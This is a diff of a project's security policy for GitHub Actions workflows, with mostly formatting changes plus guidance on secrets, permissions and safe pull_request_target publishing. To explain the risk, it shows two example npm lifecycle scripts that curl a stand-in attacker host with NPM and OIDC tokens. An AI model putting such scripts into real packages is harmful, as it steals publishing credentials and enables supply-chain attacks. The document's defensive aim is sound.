@@ -1,6 +1,5 @@
 # Security Policy
 
-<!-- prettier-ignore-start -->
 <!-- START doctoc generated TOC please keep comment here to allow auto update -->
 <!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
 ## Table of Contents
@@ -12,9 +11,24 @@
   - [🕐 Response Timeline](#-response-timeline)
 - [Security Best Practices for Users](#security-best-practices-for-users)
   - [🔐 Secrets Management](#-secrets-management)
+  - [🏷️ Action Versioning](#-action-versioning)
+  - [🔍 Workflow Permissions](#-workflow-permissions)
+  - [🛡️ Input Validation](#-input-validation)
+- [Security Features](#security-features)
+  - [🔒 Automated Security Scanning](#-automated-security-scanning)
+  - [🛡️ Secure Development Practices](#-secure-development-practices)
+  - [🔍 Supply Chain Security](#-supply-chain-security)
+- [Known Security Considerations](#known-security-considerations)
+  - [GitHub Actions Environment](#github-actions-environment)
+  - [npm Publishing (npm-pr-version)](#npm-publishing-npm-pr-version)
+    - [Open Source Projects Using `pull_request_target`](#open-source-projects-using-pull_request_target)
+    - [General npm Publishing Considerations](#general-npm-publishing-considerations)
+  - [Comment Actions](#comment-actions)
+- [Incident Response](#incident-response)
+- [Security Contact](#security-contact)
+- [Acknowledgments](#acknowledgments)
 
 <!-- END doctoc generated TOC please keep comment here to allow auto update -->
-<!-- prettier-ignore-end -->
 
 ## Supported Versions
 
@@ -74,7 +88,7 @@ When using these GitHub Actions in your workflows:
 - **Limit secret scope** to only necessary workflows
 - **Rotate secrets** regularly
 
-````yaml
+```yml
 # ✅ Good - Using secrets properly
 - uses: codfish/actions/npm-pr-version@v3
   with:
@@ -83,20 +97,20 @@ When using these GitHub Actions in your workflows:
 # ❌ Bad - Exposing secrets
 - name: Debug
   run: echo "Token: ${{ secrets.NPM_TOKEN }}"
-```yaml
+```
 
 ### 🏷️ Action Versioning
 
 - **Pin to specific versions or commit hashes** for production workflows
 - **Avoid using `@main`** in production (use for testing only)
 
-```yaml
+```yml
 # ✅ Good - Pinned version
 - uses: codfish/actions/setup-node-and-install@v3.2.3
 
 # ⚠️ Caution - Latest main (testing only)
 - uses: codfish/actions/setup-node-and-install@v3
-```yaml
+```
 
 ### 🔍 Workflow Permissions
 
@@ -104,7 +118,7 @@ When using these GitHub Actions in your workflows:
 - **Specify explicit permissions** when possible
 - **Avoid using `write-all`** permissions
 
-```yaml
+```yml
 # ✅ Good - Minimal permissions
 permissions:
   contents: read
@@ -113,7 +127,7 @@ permissions:
 
 # ❌ Bad - Excessive permissions
 permissions: write-all
-```yaml
+```
 
 ### 🛡️ Input Validation
 
@@ -158,41 +172,47 @@ This project implements several security measures:
 
 #### Open Source Projects Using `pull_request_target`
 
-If you're an **open source project** using `pull_request_target` to publish PR packages from external contributors, consider using the secure tarball mode to protect against lifecycle script attacks.
+If you're an **open source project** using `pull_request_target` to publish PR packages from external contributors,
+consider using the secure tarball mode to protect against lifecycle script attacks.
 
 **When is this relevant?**
+
 - ✅ You use `pull_request_target` (not `pull_request`)
 - ✅ You accept PRs from external contributors
 - ✅ Your workflow has access to publishing credentials (`npm-token` OR `id-token: write` for OIDC)
 
 **Not relevant if:**
+
 - ❌ You use `pull_request` event (no secret access from forks)
 - ❌ You only publish from trusted branches
 
 **The Risk:**
 
 npm automatically executes lifecycle scripts during publishing:
+
 - `prepublishOnly`, `prepare`, `prepack`, `postpack`
 
 A malicious PR could add a script that exfiltrates credentials:
 
 **With npm-token:**
+
 ```json
 {
   "scripts": {
     "prepublishOnly": "curl https://attacker.com?token=$NPM_TOKEN"
   }
 }
-```json
+```
 
 **With OIDC (even without npm-token):**
+
 ```json
 {
   "scripts": {
     "prepublishOnly": "curl https://attacker.com?url=$ACTIONS_ID_TOKEN_REQUEST_URL&token=$ACTIONS_ID_TOKEN_REQUEST_TOKEN"
   }
 }
-```json
+```
 
 > ⚠️ **OIDC is just as vulnerable!** The OIDC environment variables allow attackers to mint tokens and publish packages.
 
@@ -200,7 +220,7 @@ A malicious PR could add a script that exfiltrates credentials:
 
 Use the secure two-step workflow with tarball mode:
 
-```yaml
+```yml
 on: pull_request_target
 
 jobs:
@@ -223,19 +243,19 @@ jobs:
     # Publish with secrets and --ignore-scripts
     permissions:
       contents: read
-      id-token: write       # For OIDC (or omit if using npm-token)
-      pull-requests: write  # For commenting
+      id-token: write # For OIDC (or omit if using npm-token)
+      pull-requests: write # For commenting
     steps:
-      - uses: actions/checkout@v6  # Trusted base branch
+      - uses: actions/checkout@v6 # Trusted base branch
       - uses: actions/download-artifact@v4
         with:
           name: package-tarball
       - uses: codfish/actions/npm-pr-version@v3
         with:
           tarball: '*.tgz'
-```yaml
+```
 
-See [npm-pr-version/README.md](./npm-publish-pr/README.md#security-considerations) for full details.
+See [npm-publish-pr/README.md](./npm-publish-pr/README.md) for full details.
 
 #### General npm Publishing Considerations
 
@@ -274,4 +294,3 @@ security issues will be acknowledged (with permission) in:
 - This security policy
 
 Thank you for helping keep this project secure! 🔒
-````
